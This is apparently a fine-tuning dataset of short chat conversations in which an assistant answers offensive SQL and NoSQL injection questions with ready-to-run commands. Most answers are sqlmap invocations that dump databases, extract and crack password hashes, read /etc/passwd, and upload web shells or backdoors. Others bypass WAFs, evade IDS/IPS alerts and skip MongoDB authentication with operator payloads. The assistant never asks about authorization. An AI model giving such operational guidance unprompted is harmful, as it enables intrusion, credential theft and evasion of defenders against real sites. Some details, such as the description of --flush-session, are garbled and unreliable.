{"conversation": [{"role": "user", "content": "How do I test if a website is vulnerable to SQL injection?"}, {"role": "assistant", "content": "Start by adding a single quote (') to the URL parameter: `curl 'http://site.com/page.php?id=1\\''`. If you see a SQL error like 'You have an error in your SQL syntax', the site is likely vulnerable. You can also test with sqlmap: `sqlmap -u 'http://site.com/page.php?id=1' --batch` for automated detection."}]}
{"conversation": [{"role": "user", "content": "I found a SQL injection. How do I list all databases?"}, {"role": "assistant", "content": "Use sqlmap with the --dbs flag: `sqlmap -u 'http://site.com/page.php?id=1' --dbs --batch`. This will enumerate all databases the application can access. You'll typically see information_schema, mysql, and the application's database."}]}
{"conversation": [{"role": "user", "content": "How do I extract data from a specific table?"}, {"role": "assistant", "content": "First get the tables: `sqlmap -u 'URL' -D database_name --tables --batch`. Then dump the table: `sqlmap -u 'URL' -D database_name -T users --dump --batch`. This will extract all data and automatically attempt to crack any password hashes found."}]}
{"conversation": [{"role": "user", "content": "The site has a WAF. How can I bypass it?"}, {"role": "assistant", "content": "Use tamper scripts: `sqlmap -u 'URL' --tamper=space2comment,between,randomcase --random-agent --batch`. First identify the WAF with `--identify-waf`. Common tampers: space2comment replaces spaces with /**/, between uses BETWEEN operator, randomcase randomizes character case."}]}
{"conversation": [{"role": "user", "content": "How do I test POST parameters for SQL injection?"}, {"role": "assistant", "content": "Use the --data flag: `sqlmap -u 'http://site.com/login.php' --data='username=admin&password=test' --batch`. Sqlmap will test each POST parameter. For JSON: `sqlmap -u 'URL' --data='{\"user\":\"admin\"}' --headers='Content-Type: application/json' --batch`."}]}
{"conversation": [{"role": "user", "content": "Can I get a shell on the server through SQL injection?"}, {"role": "assistant", "content": "Yes, if the database has file write permissions: `sqlmap -u 'URL' --os-shell --batch`. Sqlmap uploads a web shell (usually PHP) to the web root and gives you command execution. You can also use `--file-write` to upload your own backdoor."}]}
{"conversation": [{"role": "user", "content": "How do I read files from the server?"}, {"role": "assistant", "content": "Use --file-read: `sqlmap -u 'URL' --file-read='/etc/passwd' --batch`. This works if the database user has FILE privilege. Common targets: /etc/passwd, /var/www/html/config.php, application configuration files with database credentials."}]}
{"conversation": [{"role": "user", "content": "What's a UNION-based SQL injection?"}, {"role": "assistant", "content": "UNION lets you combine query results. Test column count: `curl 'URL?id=1\\' UNION SELECT NULL,NULL,NULL--'`. No error means 3 columns. Then extract data: `curl 'URL?id=1\\' UNION SELECT 1,version(),database()--'` to get MySQL version and current database name."}]}
{"conversation": [{"role": "user", "content": "How do I extract password hashes from MySQL?"}, {"role": "assistant", "content": "Use sqlmap: `sqlmap -u 'URL' --users --passwords --batch`. This queries mysql.user table for password hashes and attempts dictionary attacks. Or manually: `sqlmap -u 'URL' --sql-query='SELECT user,authentication_string FROM mysql.user' --batch`."}]}
{"conversation": [{"role": "user", "content": "What if sqlmap is too slow?"}, {"role": "assistant", "content": "Use threads: `sqlmap -u 'URL' --threads=10 --batch`. For specific techniques only: `--technique=U` for UNION only (fastest). Skip heavy tests: `--risk=1 --level=1`. Or if you know it's vulnerable, use previous session: sqlmap resumes automatically from saved progress."}]}
{"conversation": [{"role": "user", "content": "How do I test for time-based blind SQL injection?"}, {"role": "assistant", "content": "Manually: `curl 'URL?id=1\\' AND SLEEP(5)--' -w 'Time: %{time_total}s'`. If it takes 5+ seconds, it's vulnerable. With sqlmap: `sqlmap -u 'URL' --technique=T --batch`. Time-based is slower but works when there's no visible output."}]}
{"conversation": [{"role": "user", "content": "What's a NoSQL injection and how is it different?"}, {"role": "assistant", "content": "NoSQL injection targets MongoDB, CouchDB etc. Uses query operators instead of SQL syntax. Example: `curl -X POST 'http://api.com/login' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}'`. The $ne (not equal) operator bypasses authentication."}]}
{"conversation": [{"role": "user", "content": "How do I bypass MongoDB authentication?"}, {"role": "assistant", "content": "Use operator injection: `{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}` matches any password not equal to empty string. Or $gt: `{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}` matches all users. Works when app doesn't validate input types."}]}
{"conversation": [{"role": "user", "content": "How do I extract all users from MongoDB?"}, {"role": "assistant", "content": "Use comparison operators: `curl 'http://api.com/users?username[$gt]=' | jq .` The $gt (greater than) empty string matches all documents. Or $regex: `curl 'http://api.com/search?query[$regex]=.*' | jq .` matches everything with regex."}]}
{"conversation": [{"role": "user", "content": "What's the $where operator in MongoDB injection?"}, {"role": "assistant", "content": "It allows JavaScript execution: `{\"username\":\"admin\",\"password\":{\"$where\":\"return true\"}}`. Extremely dangerous - executes arbitrary JS code. Most MongoDB instances have $where disabled now, but worth testing on older systems."}]}
{"conversation": [{"role": "user", "content": "How do I search for admin accounts in NoSQL?"}, {"role": "assistant", "content": "Use $regex with case-insensitive flag: `curl 'http://api.com/search?query[$regex]=admin.*&query[$options]=i' | jq .` This finds admin, administrator, admin_backup, etc. Or use $or: `{\"$or\":[{\"role\":\"admin\"},{\"role\":\"superuser\"}]}`."}]}
{"conversation": [{"role": "user", "content": "Can I use sqlmap on JSON APIs?"}, {"role": "assistant", "content": "Yes: `sqlmap -u 'http://api.com/endpoint' --data='{\"id\":\"1\"}' --headers='Content-Type: application/json' --batch`. Sqlmap will test JSON parameters. Some JSON APIs are vulnerable to SQL injection if they construct SQL queries from JSON input."}]}
{"conversation": [{"role": "user", "content": "How do I save an HTTP request for sqlmap?"}, {"role": "assistant", "content": "Capture request in Burp Suite, right-click -> Copy to file. Or manually create request.txt with full HTTP headers and body. Then: `sqlmap -r request.txt --batch`. This tests all parameters including cookies and headers."}]}
{"conversation": [{"role": "user", "content": "What's the difference between --risk and --level in sqlmap?"}, {"role": "assistant", "content": "Level (1-5) controls number of tests: higher = more thorough but slower. Risk (1-3) controls dangerous tests: risk 3 includes OR-based payloads that might modify data. Default is --risk=1 --level=1. Use --risk=3 --level=5 only with permission."}]}
{"conversation": [{"role": "user", "content": "How do I extract only specific columns?"}, {"role": "assistant", "content": "Use -C flag: `sqlmap -u 'URL' -D webapp_db -T users -C username,password,email --dump --batch`. This dumps only specified columns instead of entire table. Faster and more focused than dumping everything."}]}
{"conversation": [{"role": "user", "content": "Can I run custom SQL queries?"}, {"role": "assistant", "content": "Yes, use --sql-query: `sqlmap -u 'URL' --sql-query='SELECT @@version' --batch`. Or use interactive SQL shell: `sqlmap -u 'URL' --sql-shell --batch`, then type queries interactively like `SELECT * FROM users WHERE role='admin'`."}]}
{"conversation": [{"role": "user", "content": "How do I check if current database user is DBA?"}, {"role": "assistant", "content": "Run: `sqlmap -u 'URL' --current-user --is-dba --batch`. This shows the current database user and whether they have DBA (root) privileges. If DBA=True, you can likely read/write files and execute OS commands."}]}
{"conversation": [{"role": "user", "content": "What privileges do I need to upload a shell?"}, {"role": "assistant", "content": "You need FILE privilege and write access to web root. Check with: `sqlmap -u 'URL' --privileges --batch`. If current user has FILE privilege, try: `sqlmap -u 'URL' --os-shell --batch`. It uploads PHP/ASP shell to accessible web directory."}]}
{"conversation": [{"role": "user", "content": "How do I avoid triggering IDS/IPS alerts?"}, {"role": "assistant", "content": "Use stealth options: `sqlmap -u 'URL' --delay=2 --timeout=30 --retries=3 --random-agent --batch`. Delay adds 2s between requests, random-agent changes user-agent each request. Lower risk/level: `--risk=1 --level=1` makes fewer, less obvious requests."}]}
{"conversation": [{"role": "user", "content": "Can I test multiple URLs from a file?"}, {"role": "assistant", "content": "Yes: `sqlmap -m urls.txt --batch`. Create urls.txt with one URL per line. Sqlmap tests each URL sequentially. Use `--threads=10` to test multiple URLs in parallel for faster scanning."}]}
{"conversation": [{"role": "user", "content": "How do I search for password columns across all databases?"}, {"role": "assistant", "content": "Use --search: `sqlmap -u 'URL' --search -C password,passwd,pwd --batch`. This searches all databases for columns matching those names. Useful for finding where credentials are stored in unfamiliar databases."}]}
{"conversation": [{"role": "user", "content": "What's the best way to crack the extracted password hashes?"}, {"role": "assistant", "content": "Sqlmap auto-cracks common hashes during dump. For manual cracking: save hashes to file, identify type (MD5, SHA256, bcrypt), then use hashcat: `hashcat -m 0 hashes.txt rockyou.txt` (mode 0 = MD5). Or John: `john --wordlist=rockyou.txt hashes.txt`."}]}
{"conversation": [{"role": "user", "content": "How do I test cookies for SQL injection?"}, {"role": "assistant", "content": "Sqlmap automatically tests cookies: `sqlmap -u 'http://site.com/page.php' --cookie='PHPSESSID=abc123; user_id=1' --batch`. Use -p to force test specific parameter: `sqlmap -u 'URL' --cookie='id=1' -p id --batch`."}]}
{"conversation": [{"role": "user", "content": "What does --batch do in sqlmap?"}, {"role": "assistant", "content": "It answers all prompts automatically with default values, making sqlmap fully automated. Without --batch, sqlmap asks questions like 'do you want to test other parameters?', 'crack password hashes?', etc. Always use --batch for automated scanning."}]}
{"conversation": [{"role": "user", "content": "How do I resume a previous sqlmap scan?"}, {"role": "assistant", "content": "Sqlmap automatically saves session data. Just run the same command again - it will ask 'do you want to resume?'. Or force resume with `--flush-session` to start fresh, or `--resume` flag. Sessions stored in ~/.local/share/sqlmap/output/."}]}
